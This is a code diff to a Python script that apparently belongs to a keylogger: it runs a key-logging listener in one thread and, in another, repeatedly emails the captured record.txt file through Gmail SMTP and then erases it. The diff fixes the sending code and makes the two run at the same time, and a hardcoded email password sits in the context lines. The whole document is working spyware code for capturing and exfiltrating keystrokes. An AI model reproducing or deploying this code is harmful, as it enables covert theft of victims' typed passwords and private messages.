@@ -5,8 +5,10 @@ import smtplib
 import datetime
 import pause
 import logger
+import threading
 from email import encoders
 from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 # To and From email addresses (Same for testing purposes)
@@ -20,10 +22,18 @@ FRM_PSWD = "DGisonline13"
 # Path to record.txt
 REC_PATH = "record.txt"
 
+RUNNING = False
+
 
 def export():
-    while True:
-        pause.seconds(30)
+    global RUNNING
+    RUNNING = True
+    # Counter for export loop. Really only used for testing
+    counter = 5
+    while counter > 0:
+
+        # Waiting 30 seconds for more keys to be typed
+        pause.seconds(10)
 
         # Set up connection / login to email account
         server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -35,6 +45,8 @@ def export():
         msg['From'] = FRM_ADDRESS
         msg['To'] = TO_ADDRESS
         msg['Subject'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        body = " Loggings from: " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        msg.attach(MIMEText(body, 'plain'))
 
         # Open record.txt as a MINEBase object (Necessary for attaching to email)
         file = MIMEBase('application', 'octet-stream')
@@ -44,16 +56,23 @@ def export():
         msg.attach(file)
 
         # Send and close connection to mail server
-        server.sendmail(FRM_ADDRESS, TO_ADDRESS, msg)
+        server.sendmail(FRM_ADDRESS, TO_ADDRESS, msg.as_string())
         server.quit()
 
         # Erases .txt file to avoid repeat data (May interfere with actual logging..?)
         open(REC_PATH, 'w').close()
 
-        # Start the logger again
-        logger.listen()
+        # Decrement counter
+        counter -= 1
+
+    return
 
 
 if __name__ == '__main__':
-    logger.listen()
-    export()
+    # Creates threads for both the logger and export functions so they may run simultaneously
+    t1 = threading.Thread(target=export)
+    t2 = threading.Thread(target=logger.listen)
+    t1.start()
+    t2.start()
+    t1.join()
+    t2.join()
